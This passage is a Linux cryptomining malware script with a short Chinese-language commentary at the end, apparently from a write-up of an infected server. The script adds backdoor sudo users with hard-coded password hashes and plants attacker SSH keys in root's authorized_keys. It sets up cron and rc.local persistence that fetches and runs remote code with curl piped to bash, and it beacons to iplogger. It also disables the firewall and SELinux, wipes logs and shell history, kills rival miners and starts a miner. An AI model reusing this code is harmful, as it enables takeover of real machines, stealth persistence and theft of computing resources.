                chattr -ia /etc/sudoers
                echo "logger    ALL=(ALL)       ALL" >>/etc/sudoers
                chattr +ia /etc/sudoers
                chattr +ia /etc/passwd
                chattr +ia /etc/shadow
                echo "logger user added"
        fi

        if id "system" 2>/dev/null; then
                echo "system user already exists"
                chattr -ia /etc/passwd
                chattr -ia /etc/shadow
                usermod -p 'bAC5QOFFSK9bo' system
                chattr +ia /etc/passwd
                chattr +ia /etc/shadow
        else
                echo "system user does not exist, creating..."
                chattr -ia /etc/passwd
                chattr -ia /etc/shadow
                useradd -p 'bAC5QOFFSK9bo' -G root -s /bin/bash -g system -d /opt/system system
                #usermod -aG root system;
                chattr -ia /etc/sudoers
                echo "system    ALL=(ALL)       ALL" >>/etc/sudoers
                chattr +ia /etc/sudoers
                chattr +ia /etc/passwd
                chattr +ia /etc/shadow
                echo "system user added"
        fi

}

##UNUSED ATM
nameservercheck() {
        echo "checking if name servers exist"
        cat /etc/resolv.conf | grep -e "nameserver 1.1.1.1" | grep -v grep
        if [ $? -eq 0 ]; then
                echo "already exists"
        else
                echo "does not exist...need to insert new line"
                #echo "nameserver 1.1.1.1" >> /etc/resolv.conf;
                sed -i '1s/^/nameserver 1.1.1.1\n/' /etc/resolv.conf
        fi

        echo "checking if name servers exist"
        cat /etc/resolv.conf | grep -e "nameserver 8.8.8.8" | grep -v grep
        if [ $? -eq 0 ]; then
                echo "already exists"
        else
                echo "does not exist...need to insert new line"
                #echo "nameserver 1.1.1.1" >> /etc/resolv.conf;
                sed -i '1s/^/nameserver 8.8.8.8\n/' /etc/resolv.conf
        fi
}
resetcron(){
echo "replacing cron..."
chattr -R -aui /var/spool/cron/
chattr -aui /var/spool/cron/root
rm /var/spool/cron/root
mkdir -p /etc/cron.d
mkdir -p /var/spool/cron
echo '*/7 * * * * curl -A fczyo-cron/1.6 -sL $(curl -sL https://anonpasta.rocks/raw/nofoletove) | bash -s >/dev/null 2>&1' >>~/cron || true &&
echo '*/10 * * * * curl -A fczyo-cron/1.6 -sL $(curl -sL https://anonpasta.rocks/raw/imusacubix) | bash -s >/dev/null 2>&1' >>~/cron || true &&
echo '*/3 * * * * curl -A goodboy/1.5 -sL https://iplogger.org/1i9ve7' >>~/cron || true &&
echo '*/2 * * * * curl -A fczyo-cron/1.6 -sL $(curl -sL https://anonpasta.rocks/raw/atucewakep) | bash -s >/dev/null 2>&1' >>~/cron || true &&
crontab -u root ~/cron || true &&
anacron -t ~/cron
rm -rf ~/cron
chattr +ia /var/spool/cron/root
chattr -R +ia /var/spool/cron/

}

croncheckgo() {
        #TODO check if cron running on different OS's and add logic
        service crond start
        service cron start
        echo "checking cron"
        crontab -l | grep -e "https://anonpasta.rocks/raw/atucewakep" | grep -v grep
        if [ $? -eq 0 ]; then
                echo "cron good"
        else
                echo "replacing cron..."
                chattr -R -aui /var/spool/cron/
                chattr -aui /var/spool/cron/root
                rm /var/spool/cron/root
                mkdir -p /etc/cron.d
                mkdir -p /var/spool/cron
                        echo '*/7 * * * * curl -A fczyo-cron/1.6 -sL $(curl -sL https://anonpasta.rocks/raw/nofoletove) | bash -s >/dev/null 2>&1' >>~/cron || true &&
                        echo '*/10 * * * * curl -A fczyo-cron/1.6 -sL $(curl -sL https://anonpasta.rocks/raw/imusacubix) | bash -s >/dev/null 2>&1' >>~/cron || true &&
                        echo '*/3 * * * * curl -A goodboy/1.5 -sL https://iplogger.org/1i9ve7' >>~/cron || true &&
                        echo '*/2 * * * * curl -A fczyo-cron/1.6 -sL $(curl -sL https://anonpasta.rocks/raw/atucewakep) | bash -s >/dev/null 2>&1' >>~/cron || true &&
                        crontab -u root ~/cron || true &&
                        anacron -t ~/cron
                rm -rf ~/cron
                chattr +ia /var/spool/cron/root
                chattr -R +ia /var/spool/cron/
        fi

        echo "checking cron for bad entries..."
        crontab -l | grep -e "205.185.113.35" | grep -v grep
        crontab -l | grep -e "log_rotate" | grep -v grep
        crontab -l | grep -e "192.99.142.226\|82.146.58.234\|83.220.169.247\|91.201.42.5" | grep -v grep
        crontab -l | grep -e "pastebin.com" | grep -v grep
        crontab -l | grep -e "gitee" | grep -v grep
        crontab -l | grep -e "mr.sh" | grep -v grep
        crontab -l | grep -e "2mr.sh" | grep -v grep
        crontab -l | grep -e "cr5.sh" | grep -v grep
        crontab -l | grep -e "systemten" | grep -v grep
        crontab -l | grep -e "logo9.jpg" | grep -v grep
        crontab -l | grep -e "xmrig" | grep -v grep
        if [ $? -eq 0 ]; then
                cronab -r
                echo "Bad entries found...replacing cron..."
                chattr -aui /var/spool/cron/
                chattr -aui /var/spool/cron/root
                rm /var/spool/cron/root
                mkdir -p /etc/cron.d
                mkdir -p /var/spool/cron
                        echo '*/7 * * * * curl -A fczyo-cron/1.6 -sL $(curl -sL https://anonpasta.rocks/raw/nofoletove) | bash -s >/dev/null 2>&1' >>~/cron || true &&
                        echo '*/10 * * * * curl -A fczyo-cron/1.6 -sL $(curl -sL https://anonpasta.rocks/raw/imusacubix) | bash -s >/dev/null 2>&1' >>~/cron || true &&
                        echo '*/3 * * * * curl -A goodboy/1.5 -sL https://iplogger.org/1i9ve7' >>~/cron || true &&
                        echo '*/2 * * * * curl -A fczyo-cron/1.6 -sL $(curl -sL https://anonpasta.rocks/raw/atucewakep) | bash -s >/dev/null 2>&1' >>~/cron || true &&
                        crontab -u root ~/cron || true &&
                        anacron -t ~/cron
                rm -rf ~/cron
                chattr +ia /var/spool/cron/root
                chattr +ia /var/spool/cron/
        else
                echo "cron does not contain any checked entries - do not needs to replace"
        fi
}

checkrc() {
        if test -f /etc/rc.d/rc.local; then
                echo "/etc/rc.d/rc.local exists, lets check contents..."
                cat /etc/rc.d/rc.local | grep -vw grep | grep "Fsf3sfX"
                if [ $? -eq 0 ]; then
                        echo "/etc/rc.d/rc.local exists and has correct contents"
                        chattr -ia /etc/rc.d/rc.local
                        chmod +x /etc/rc.d/rc.local
                        chattr +ia /etc/rc.d/rc.local
                        if test -f /etc/rc.local; then
                                echo "rc.local exists, deleting in order to make symlink to /etc/rc.d/rc.local"
                                chattr -ia /etc/rc.d/rc.local
                                chattr -ia /etc/rc.local
                                rm /etc/rc.local
                                ln -s /etc/rc.d/rc.local /etc/rc.local
                        else
                                echo "/etc/rc.local does not exist"
                                ln -s /etc/rc.d/rc.local /etc/rc.local
                        fi
                        #systemctl enable rc-local;
                        #systemctl start rc-local;
                        #TODO check if running and start if not or restart instead of start.
                        #systemctl restart rc-local;
                else
                        echo "**CONTENTS WRONG** - inserting correct contents into /etc/rc.d/rc.local"
                        chattr -ia /etc/rc.d/rc.local
                        rm -rf /etc/rc.d/rc.local
                        IP=`curl -sL http://icanhazip.com`;
                        {
                                echo '#!/bin/bash'
                                echo '#rc.local'
                                echo '#Fsf3sfX'
                                echo 'chattr -ia /etc/passwd'
                                echo 'chattr -ia /etc/shadow'
                                echo 'chattr -ia /etc/sudoers'
                                echo 'curl -A rc.local/1.6 -sL $(curl -sL https://anonpasta.rocks/raw/atucewakep) | bash -s >/dev/null 2>&1'
                                echo 'curl -A initial-$IP -sL https://iplogger.org/1Rfhy7 >/dev/null 2>&1'
                                echo 'curl -A rc.local/1.6 -sL $(curl -sL https://anonpasta.rocks/raw/nofoletove) | bash -s >/dev/null 2>&1'
                                echo 'exit 0'
                        } >>/etc/rc.d/rc.local
                        chmod +x /etc/rc.d/rc.local
                        chattr +ia /etc/rc.d/rc.local
                        if test -f /etc/rc.local; then
                                echo "rc.local exists, deleting in order to make symlink to /etc/rc.d/rc.local"
                                chattr -ia /etc/rc.d/rc.local
                                chattr -ia /etc/rc.local
                                rm /etc/rc.local
                                ln -s /etc/rc.d/rc.local /etc/rc.local
                        else
                                echo "/etc/rc.local does not exist"
                                ln -s /etc/rc.d/rc.local /etc/rc.local
                        fi

                        echo "fixing /etc/rc.d/rc.local - DONE"
                        #systemctl enable rc-local;
                        #systemctl start rc-local;
                        #TODO check if running and start if not or restart instead of start.
                        #systemctl restart rc-local;
                fi
        else
                echo "/etc/rc.d/rc.local does not exist...creating"
                IP=`curl -sL http://icanhazip.com`
                {
                        echo '#!/bin/bash'
                        echo '#rc.local'
                        echo '#Fsf3sfX'
                        echo 'chattr -ia /etc/passwd'
                        echo 'chattr -ia /etc/shadow'
                        echo 'chattr -ia /etc/sudoers'
                        echo 'curl -A rc.local/1.6 -sL $(curl -sL https://anonpasta.rocks/raw/atucewakep) | bash -s >/dev/null 2>&1'
                        echo 'curl -A initial-$IP -sL https://iplogger.org/1Rfhy7 >/dev/null 2>&1'
                        echo 'curl -A rc.local/1.6 -sL $(curl -sL https://anonpasta.rocks/raw/nofoletove) | bash -s >/dev/null 2>&1'
                        echo 'exit 0'
                } >>/etc/rc.d/rc.local
                chmod +x /etc/rc.d/rc.local
                chattr +ia /etc/rc.d/rc.local
                if test -f /etc/rc.local; then
                        echo "rc.local exists, deleting in order to make symlink to /etc/rc.d/rc.local"
                        chattr -ia /etc/rc.d/rc.local
                        chattr -ia /etc/rc.local
                        rm /etc/rc.local
                        ln -s /etc/rc.d/rc.local /etc/rc.local
                else
                        echo "/etc/rc.local does not exist"
                        ln -s /etc/rc.d/rc.local /etc/rc.local
                fi

        fi
}

securitygo() {
        craigrowland=$(find /usr -name sandfly-filescan)
        for klingon in $craigrowland; do
                chattr -iua $klingon;
                rm -rf $klingon;
        done
        #needresets=0;
        pkill -f kdevtmpfsi;
        rm -rf /tmp/kdevtmpfsi;
        rm -rf /tmp/kinsing;
        rm -rf /var/tmp/kinsing;
        setenforce 0;
        rm -rf /var/log/secure;
        rm -rf /var/log/cron;
        rm -rf /var/log/audit/*;
        which ufw;
        if [ $? -eq 0 ]; then
                echo "disabling ufw"
                ufw disable
        else
                echo "ufw not installed"
        fi

        if test -f /root/.bash_history; then
                echo "root bash history exists..removing"
                rm /root/.bash_history
                echo "root bash history no longer exists"
        else
                echo "root bash history does not exist..zZzZZZzzzZZzzZzzzz"
        fi
}

iptableschecker() {
        if /sbin/iptables-save | grep -q '34.69.248.204'; then
                echo "Iptables 34.69.248.204 already set....skipping!!!!!"
        else
                # set up iptables here
                #iptables -I INPUT -s 34.69.248.204/32 -j ACCEPT
                iptables -I INPUT -s 34.69.248.204/32 -j ACCEPT
        fi
        ###################################################################
        if /sbin/iptables-save | grep -q '138.68.14.52'; then
                echo "Iptables 138.68.14.52 already set....skipping!!!!!"
        else
                # set up iptables here
                #iptables -I INPUT -s 138.68.14.52/32 -j ACCEPT
                iptables -I INPUT -s 138.68.14.52/32 -j ACCEPT
        fi
        ###################################################################
        if /sbin/iptables-save | grep -q '178.128.237.155'; then
                echo "Iptables 178.128.237.155 already set....skipping!!!!!"
        else
                # set up iptables here
                #iptables -I INPUT -s 178.128.237.155/32 -j ACCEPT
                iptables -I INPUT -s 178.128.237.155/32 -j ACCEPT
        fi
        ##################################################################

        if /sbin/iptables-save | grep -q '64.225.46.44'; then
                echo "Iptables 64.225.46.44 already set....skipping!!!!!"
        else
                # set up iptables here
                #iptables -I INPUT -s 64.225.46.44/32 -j ACCEPT
                iptables -I INPUT -s 64.225.46.44/32 -j ACCEPT
        fi
        ##################################################################
        if /sbin/iptables-save | grep -q 'dport 2375 -j DROP'; then
                echo "Iptables 2375 already set....skipping!!!!!"
        else
                # set up iptables here
                iptables -A INPUT -p tcp -m tcp --dport 2375 -j DROP
        fi
        ###################################################################
        if /sbin/iptables-save | grep -q 'dport 2376 -j DROP'; then
                echo "Iptables 2376 already set....skipping!!!!!"
        else
                # set up iptables here
                iptables -A INPUT -p tcp -m tcp --dport 2376 -j DROP
        fi
        ###################################################################
                if /sbin/iptables-save | grep -q 'dport 2377 -j DROP'; then
                echo "Iptables 2377 already set....skipping!!!!!"
        else
                # set up iptables here
                iptables -A INPUT -p tcp -m tcp --dport 2377 -j DROP
        fi
        ###################################################################
                if /sbin/iptables-save | grep -q 'dport 4244 -j DROP'; then
                echo "Iptables 4244 already set....skipping!!!!!"
        else
                # set up iptables here
                iptables -A INPUT -p tcp -m tcp --dport 4244 -j DROP
        fi
        ###################################################################
                if /sbin/iptables-save | grep -q 'dport 4243 -j DROP'; then
                echo "Iptables 4243 already set....skipping!!!!!"
        else
                # set up iptables here
                iptables -A INPUT -p tcp -m tcp --dport 4243 -j DROP
        fi
        ###################################################################
}

configfilecheck() {
        if test -f /var/tmp/bbb/.config_download.pid; then
                #echo "pid exists, skidp to next section"
                ##  grep if server is correct, if not delete and redownload
                #ps aux | grep -v grep | grep 'curl' | grep 'tcazmp' | awk '{print $2}' | xargs -I % kill -9 %
                #ps aux | grep -v grep | grep 'curl' | grep 'iqmjlf' | awk '{print $2}' | xargs -I % kill -9 %
                #ps aux | grep -v grep | grep 'curl' | grep 'config.json' | awk '{print $2}' | xargs -I % kill -9 %
                #ps aux | grep -v grep | grep 'curl' | grep 'xanthe' | awk '{print $2}' | xargs -I % kill -9 %
                cat /var/tmp/bbb/config.json| grep -e "xanthexmr.anondns.net:8181";
                        if [ $? -eq 0 ]; then
                                echo " config file correct skip to next section";
                        else
                                echo "config file bad";
                                rm -rf /var/tmp/bbb/.config_download.pid;
                                configfilecheck;
                        fi
        else
                chattr -ia /var/tmp/bbb/config.json
                rm -rf /var/tmp/bbb/config.json
                curl -A configcheck/1.6 -sL -o /var/tmp/bbb/config.json $(curl -sL "https://anonpasta.rocks/raw/ohobasocod")
                        if md5sum --status -c - <<<"31776957b5be0f54c46f84bdac8544de /var/tmp/bbb/config.json"; then
                                echo "correct copy now in place"
                                #chattr +ia /var/tmp/bbb/config.json
                                touch /var/tmp/bbb/.config_download.pid
                        else
                                echo "oh fuck... its broke"
                                #chattr -ia /var/tmp/bbb/config.json;
                                curl -A configcheck/1.6 -sL -o /var/tmp/bbb/config.json $(curl -sL "https://anonpasta.rocks/raw/ratozakuru")
                                #chattr +ia /var/tmp/bbb/config.json
                                touch /var/tmp/bbb/.config_download.pid
                        fi
        fi

}

filerungo() {
        ps aux | grep -vw bbb/bbb | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
        ps -fe | grep -w bbb/bbb | grep -v grep | grep -v http
        if [ $? -eq 0 ]; then
                echo "RUNNING all is good in the hood"
                chattr +iau /var/tmp/bbb/bbb
        else
                sysctl -w vm.nr_hugepages="$(nproc --all)"
                echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
                chattr -iau /var/tmp/bbb/bbb
                #chattr -iauR /tmp/bbb/
                #chattr -iauR /opt/bbb/
                chmod +x /var/tmp/bbb/bbb
                #
                #chmod +x /opt/bbb/bbb
                #chattr +iau /var/tmp/bbb/bbb
                #chattr +iauR /tmp/bbb/
                #chattr +iauR /opt/bbb/
                #/var/tmp/bbb/bbb || /opt/bbb/bbb
                /var/tmp/bbb/bbb
                sleep 10s
                ps -fe | grep -w bbb/bbb | grep -v grep | grep -v http
                if [ $? -eq 0 ]; then
                        echo "NOW we are RUNNING"
                        chattr +iau /var/tmp/bbb/bbb
                else
                        sysctl -w vm.nr_hugepages="$(nproc --all)"
                        echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
                        /var/tmp/bbb/bbb -c /var/tmp/bbb/config.json
                fi
        fi
}

addloggersshkey() {

        if [ -f "/opt/logger/.ssh/authorized_keys" ]; then
                echo "authorized_keys file exists in logger home directory"
                if md5sum --status -c - <<<"5ce861ddfec4f14dae5d250418834ef8 /opt/logger/.ssh/authorized_keys"; then
                        echo "key is good...nothing to do"
                else
                        echo "key checksums dont match...replacing"
                        echo "" >>/opt/logger/.ssh/authorized_keys
                        chmod 600 /opt/logger/.ssh/authorized_keys
                        echo "setting up user key"
                        mkdir /opt/logger
                        mkdir /opt/logger/.ssh
                        chmod 700 /opt/logger/.ssh
                        touch /opt/logger/.ssh/authorized_keys
                        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O/7qHc/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y/U1/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv" >>/opt/logger/.ssh/authorized_keys
                        chmod 600 /opt/logger/.ssh/authorized_keys
                        chown -R logger:logger /opt/logger
                        chattr +ia /opt/logger/.ssh/authorized_keys
                        chattr -ia /etc/passwd
                        chattr -ia /etc/shadow
                        usermod -d /opt/logger logger
                        chattr +ia /etc/passwd
                        chattr +ia /etc/shadow
                fi
        else
                echo "does not exist at all, creating key"
                mkdir /opt/logger
                mkdir /opt/logger/.ssh
                chmod 700 /opt/logger/.ssh
                touch /opt/logger/.ssh/authorized_keys
                echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O/7qHc/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y/U1/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv" >>/opt/logger/.ssh/authorized_keys
                chmod 600 /opt/logger/.ssh/authorized_keys
                chown -R logger:logger /opt/logger
                chattr +ia /opt/logger/.ssh/authorized_keys
                sudo chattr -ia /etc/passwd
                sudo chattr -ia /etc/shadow
                sudo usermod -d /opt/logger logger
                chattr +ia /etc/passwd
                chattr +ia /etc/shadow
        fi
}

addsystemsshkey() {

        if [ -f "/opt/system/.ssh/authorized_keys" ]; then
                echo "authorized_keys file exists in system home directory"
                if md5sum --status -c - <<<"5ce861ddfec4f14dae5d250418834ef8 /opt/system/.ssh/authorized_keys"; then
                        echo "key is good...nothing to do"
                else
                        echo "key checksums dont match...replacing"
                        echo "" >>/opt/system/.ssh/authorized_keys
                        chmod 600 /opt/system/.ssh/authorized_keys
                        echo "setting up system user key"
                        mkdir /opt/system
                        mkdir /opt/system/.ssh
                        chmod 700 /opt/system/.ssh
                        touch /opt/system/.ssh/authorized_keys
                        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O/7qHc/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y/U1/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv" >>/opt/system/.ssh/authorized_keys
                        chmod 600 /opt/system/.ssh/authorized_keys
                        chown -R system:system /opt/system
                        chattr +ia /opt/system/.ssh/authorized_keys
                        chattr -ia /etc/passwd
                        chattr -ia /etc/shadow
                        usermod -d /opt/system system
                        chattr +ia /etc/passwd
                        chattr +ia /etc/shadow
                fi
        else
                echo "does not exist at all, creating key"
                mkdir /opt/system
                mkdir /opt/system/.ssh
                chmod 700 /opt/system/.ssh
                touch /opt/system/.ssh/authorized_keys
                echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O/7qHc/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y/U1/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv" >>/opt/system/.ssh/authorized_keys
                chmod 600 /opt/system/.ssh/authorized_keys
                chown -R system:system /opt/system
                chattr +ia /opt/system/.ssh/authorized_keys
                sudo chattr -ia /etc/passwd
                sudo chattr -ia /etc/shadow
                sudo usermod -d /opt/system system
                chattr +ia /etc/passwd
                chattr +ia /etc/shadow
        fi
}

addautoupdatersshkey() {

        if [ -f "/opt/autoupdater/.ssh/authorized_keys" ]; then
                echo "authorized_keys file exists in autoupdater home directory"
                if md5sum --status -c - <<<"5ce861ddfec4f14dae5d250418834ef8 /opt/autoupdater/.ssh/authorized_keys"; then
                        echo "key is good...nothing to do"
                else
                        echo "key checksums dont match...replacing"
                        echo "" >>/opt/autoupdater/.ssh/authorized_keys
                        chmod 600 /opt/autoupdater/.ssh/authorized_keys
                        echo "setting up autoupdater user key"
                        mkdir /opt/autoupdater
                        mkdir /opt/autoupdater/.ssh
                        chmod 700 /opt/autoupdater/.ssh
                        touch /opt/autoupdater/.ssh/authorized_keys
                        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O/7qHc/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y/U1/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv" >>/opt/autoupdater/.ssh/authorized_keys
                        chmod 600 /opt/autoupdater/.ssh/authorized_keys
                        chown -R autoupdater:autoupdater /opt/autoupdater
                        chattr +ia /opt/autoupdater/.ssh/authorized_keys
                        chattr -ia /etc/passwd
                        chattr -ia /etc/shadow
                        usermod -d /opt/autoupdater autoupdater
                        chattr +ia /etc/passwd
                        chattr +ia /etc/shadow
                fi
        else
                echo "does not exist at all, creating key"
                mkdir /opt/autoupdater
                mkdir /opt/autoupdater/.ssh
                chmod 700 /opt/autoupdater/.ssh
                touch /opt/autoupdater/.ssh/authorized_keys
                echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O/7qHc/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y/U1/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv" >>/opt/autoupdater/.ssh/authorized_keys
                chmod 600 /opt/autoupdater/.ssh/authorized_keys
                chown -R autoupdater:autoupdater /opt/autoupdater
                chattr +ia /opt/autoupdater/.ssh/authorized_keys
                sudo chattr -ia /etc/passwd
                sudo chattr -ia /etc/shadow
                sudo usermod -d /opt/autoupdater autoupdater
                chattr +ia /etc/passwd
                chattr +ia /etc/shadow
        fi
}

sshkeysgo() {
        if [ -f "/root/.ssh/authorized_keys" ]; then
                echo "authorized_keys file exists in root home directory"
        else
                needreset=1
                mkdir -p /root/.ssh
                echo "" >>/root/.ssh/authorized_keys
                chmod 600 /root/.ssh/authorized_keys
        fi

        cat /root/.ssh/authorized_keys | grep "AAAAB3NzaC1yc2EAAAABJQAAAQEAoL" | grep -v grep >/dev/null
        if [ $? -eq 0 ]; then
                echo "Good root Pub Key1 exists in file"
        else
                echo "placing root pubkey1 in file"
                needreset=1
                mkdir -p /root/.ssh
                chattr -ia /root/.ssh/authorized_keys
                chmod 600 /root/.ssh/authorized_keys
                #echo -e "\n" >> /root/.ssh/authorized_keys;
                sed -i -e '$a\' /root/.ssh/authorized_keys # This adds \n at the end of the file only if it doesn't already end with a new line. So if you run it twice it will not add another blank line.
                echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAoLLx+/ZJnMGV2c7T1GGkl1jkyJJ6unLU6nQ7cOo2Qdwp+ommzKhyYEW8HExtgZqzLcGeKksSPU1nvsmoTWJY1Z1qzdx/AOkh5N+yDHan1nIph002u/1ASAmrtEEpg9t2a0iwJPix2KexVMQ/5aVCfd6cJaMc8df9rUwB4U+q6gqPql9RNZXra148/KfOTzs55GlLbJIPK5/KBzBAUEMRCEB4vYehRkY+DxZTrYliVtHgu4nW7W2Q/ffQbftl1gD5DFPDB6BUzkQKH2NYwqB1ntfhmabYg3gpjY+InY2gJGyH37TdqmSDWeyetlNbDl0aGVWc5c3kTdXds4w4w/oFow== bionic" >>/root/.ssh/authorized_keys
                chattr +ia /root/.ssh/authorized_keys
        fi

        cat /root/.ssh/authorized_keys | grep "AAAAB3NzaC1yc2EAAAADAQABAAABAQ" | grep -v grep >/dev/null
        if [ $? -eq 0 ]; then
                echo "Good root Pub Key2 exists in file"
        else
                echo "placing root pubkey2 in file"
                needreset=1
                mkdir -p /root/.ssh
                chattr -ia /root/.ssh/authorized_keys
                chmod 600 /root/.ssh/authorized_keys
                #echo -e "\n" >> /root/.ssh/authorized_keys;
                sed -i -e '$a\' /root/.ssh/authorized_keys # This adds \n at the end of the file only if it doesn't already end with a new line. So if you run it twice it will not add another blank line.
                echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O/7qHc/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y/U1/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv" >>/root/.ssh/authorized_keys
                chattr +ia /root/.ssh/authorized_keys
        fi

}

fixsystem() {
        sudo chattr -ia /etc/passwd
        sudo chattr -ia /etc/shadow
        sudo usermod -d /opt/system system
        sudo chattr +ia /etc/passwd
        sudo chattr +ia /etc/shadow
        chattr -ia /opt/system/.ssh/authorized_keys
        chmod 700 /opt/system/.ssh
        chmod 600 /opt/system/.ssh/authorized_keys
        chown -R system:system /opt/system
        chattr +ia /opt/system/.ssh/authorized_keys
}

fixlogger() {
        sudo chattr -ia /etc/passwd
        sudo chattr -ia /etc/shadow
        sudo usermod -d /opt/logger logger
        sudo chattr +ia /etc/passwd
        sudo chattr +ia /etc/shadow
        chattr -ia /opt/logger/.ssh/authorized_keys
        chmod 700 /opt/logger/.ssh
        chmod 600 /opt/logger/.ssh/authorized_keys
        chown -R logger:logger /opt/logger
        chattr +ia /opt/logger/.ssh/authorized_keys
}

currenthostcheckin() {

        curl -A currenthost/1.5 -sLo /dev/null https://iplogger.org/1BER87

}
successgo() {
        curl -A fczyo-success/1.4 -sLo /dev/null https://iplogger.org/1iw4r7
        date +"%r"
}

restartrcd() {
        systemctl start rc-local
}
stopscanner() {
        #temp stop scanner
        killall screen
        ps aux | grep -v grep | grep 'screen' | awk '{print $2}' | xargs -I % kill -9 %
        ps aux | grep -v grep | grep 'docker -H' | awk '{print $2}' | xargs -I % kill -9 %
        ps aux | grep -v grep | grep 'masscan' | awk '{print $2}' | xargs -I % kill -9 %
        #chattr -R -iau /var/tmp/bbb/
}

restartmining(){
ps aux | grep -v grep | grep 'bbb' | awk '{print $2}' | xargs -I % kill -9 %
curl -A xanthecheck-$PROC.$MEM -sL http://xanthe.anondns.net:8080/files/restartmining >/dev/null
}
#restartmining
currenthostcheckin
#restartrcd
#stopscanner
killcommondockers
removefuckboiskeys
firstthingsfirst
nameservercheck
usercheckgo
#fixgroupalreadyexists
#usercheckgo
#resetiptablespid
resetcron
croncheckgo
checkrc
securitygo
iptableschecker
configfilecheck
filerungo
addloggersshkey
addsystemsshkey
sshkeysgo
addautoupdatersshkey
#fixsystem
#fixlogger
successgo
```

主要下面几个函数：

```
#restartmining
currenthostcheckin     #获取本机ip
#restartrcd
#stopscanner
killcommondockers     #删除docker的一些服务，这个还好，有个连镜像也删了。。。
removefuckboiskeys    #增加rsa，可以直接ssh登录
firstthingsfirst      #禁用syslog日志，hostguard，cloudResetPwdUpdateAgent服务，然后开启定时任务crond服务，安装nano
nameservercheck       #增加dns服务器的ip，1.1.1.1 和8.8.8.8，不用谷歌的话，国内你懂的。
